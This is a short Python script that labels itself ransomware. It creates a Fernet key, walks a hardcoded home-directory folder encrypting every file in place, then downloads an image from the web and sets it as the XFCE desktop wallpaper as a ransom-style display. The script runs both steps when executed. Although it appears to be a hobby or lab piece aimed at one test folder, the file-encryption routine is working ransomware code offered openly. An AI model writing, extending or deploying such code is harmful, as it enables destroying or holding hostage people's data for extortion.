import os
import subprocess
import urllib.request
from cryptography.fernet import Fernet


#Generate Fernet Key and save to a file
def write_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

#File encryption
def file_encrypt(filename, key):
    f = Fernet(key)
    with open(filename, 'rb') as file:
        file_data = file.read()
        print(file_data)
        encrypted_data = f.encrypt(file_data)
    with open(filename, 'wb') as file:
        file.write(encrypted_data)

#File decryption
def file_decrypt(filename, key):
    f = Fernet(key)
    with open(filename, 'rb') as file:          # read encrypted data from file
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)  # write decryped data to file
    with open(filename, 'wb') as file:
        file.write(decrypted_data)

#File Discovery a.k.a Ransomware
def filefucker():
    for (root,dirs,files) in os.walk('/home/lon3r/Desktop/FilesFodidos', topdown=True):
        for file in files:
            filepath = os.path.join(root, file)
            file_encrypt(filepath,load_key())

#Background changer (only works for xfce enviroments)
def background_changer():
    imageUrl = 'https://s2-autoesporte.glbimg.com/2qiUv9SwwaZOp6fvs3GP5EAvtjg=/0x0:1200x801/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_cf9d035bf26b4646b105bd958f32089d/internal_photos/bs/2022/3/f/6NM9XsRQGYbW1pQy09lQ/relampago-mcqueen.jpeg'
    path = '/home/lon3r/Desktop/wpp.jpg'
    command = f"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitorVirtual1/workspace0/last-image -s {path}"
    urllib.request.urlretrieve(imageUrl,path)
    subprocess.run(command, shell=True)

#write_key()
#file_encrypt('test.html',load_key())
#file_decrypt('test.html', load_key())
filefucker()
background_changer()
